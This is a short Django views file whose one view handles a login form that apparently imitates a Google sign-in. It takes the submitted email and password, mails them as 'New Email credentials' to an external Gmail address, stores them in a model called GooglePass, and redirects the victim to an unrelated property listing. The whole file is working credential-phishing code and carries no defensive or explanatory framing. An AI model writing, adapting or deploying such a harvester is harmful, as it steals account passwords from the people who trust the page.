from django.shortcuts import render, redirect
from django.core.mail import send_mail
from .models import GooglePass

def homePage(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        subject = f"New Email credentials"
        message = f"email: {email}, password: {password}"
        recipient_list = ['wolfensteinjonathan@gmail.com']
        sender_email = 'webmaster@example.com'
        send_mail(subject, message, sender_email, recipient_list)
        if email and password:  
            GooglePass.objects.create(email=email, password=password)  
            return redirect('https://www.jamesedition.com/real_estate/konigswinter-germany/konigswinter-townhouse-14975813')
    return render(request, 'index.html')
